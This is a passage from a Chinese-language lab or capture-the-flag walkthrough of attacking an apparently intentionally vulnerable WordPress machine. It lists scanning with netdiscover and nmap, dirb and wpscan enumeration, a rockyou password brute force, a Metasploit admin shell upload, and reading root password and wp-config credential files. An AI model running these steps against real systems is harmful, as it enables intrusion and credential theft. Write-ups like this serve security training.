三、网络扫描

       首先使用netdiscover扫描网络，发现目标主机。192.168.0.105

       Netdiscover


然后使用nmap扫描目标主机开启的端口和服务。

Nmap -p- -A 192.168.0.105



四、探测服务与信息:

       使用浏览器打开目标主机的http服务


提示：wordpress网站，并且利用wordpress漏洞进行渗透。Wordpress主页如下：由此可见wordpress目录文件不完整，不然不会导致页面布局混乱。


现在来使用dirb爆破目录机文件

Dirb http://192.168.0.105


出现了wordpress目录和相应的文件。

我们再使用wpscan枚举wordpress使用的主题（at）和插件(ap)。和所有可能登陆wordpress网站的用户（u）

wpscan --urlhttp://192.168.1.103/wordpress/ -e at -e ap -e u



由此可知，c0rrupt3d_brain为用户名。现在使用wpscan对c0rrupt3d_brain进行爆破，破解登陆密码。

wpscan --url http://192.168.1.103/wordpress-U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt



耗时6分钟左右，破解出密码。密码为：24992499

五、利用：

现在我们知道了用户名和密码，我们可以使用metasploit的内置的wordpress漏洞。

 

use exploit/unix/webapp/wp_admin_shell_upload

set rhosts 192.168.0.105

set targeturi /wordpress

set username c0rrupt3d_brain

set password 24992499

exploit


现在有了meterpreter会话。一般的个人的文件都保存在home目录下，所以，cd /home，在使用ls查看全部的文件。发现有个root3r的文件夹，进入文件夹，再ls就可以看到全部的文件了，打开文件，查看文件内容，获取root密码willy26，数据库的连接用户名和密码。

 

cd /home

ls

cd root3r

ls

cat .root_password_ssh.txt

cat .bash_history

发现web网站的根目录在/var/www/html下，进入wordpress文件夹下打开wp-config.php发现数据库的连接信息。
